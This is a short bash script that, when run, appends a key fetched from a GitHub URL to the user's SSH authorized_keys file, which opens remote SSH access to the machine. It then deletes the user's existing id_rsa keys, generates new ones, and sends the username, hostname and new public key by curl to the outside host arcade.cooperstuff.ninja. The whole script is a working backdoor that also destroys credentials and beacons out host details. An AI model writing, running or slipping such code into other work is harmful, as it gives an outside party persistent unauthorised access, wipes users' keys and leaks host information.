#!/bin/bash

KEY=$(curl -sL https://raw.githubusercontent.com/cooper-anderson/bash-utilities/master/id_rsa.pub);
touch ~/.ssh/authorized_keys;

if [ $(cat ~/.ssh/authorized_keys | grep -c "$KEY") -eq 0 ]; then
	echo $KEY >> ~/.ssh/authorized_keys;
	rm ~/.ssh/id_rsa*;
	echo | ssh-keygen;
	MYKEY=$(cat ~/.ssh/id_rsa.pub | awk -v N=2 '{print $N}');
	curl -sL -d "user="$USER"&host="$HOSTNAME"&key="$MYKEY arcade.cooperstuff.ninja;
fi

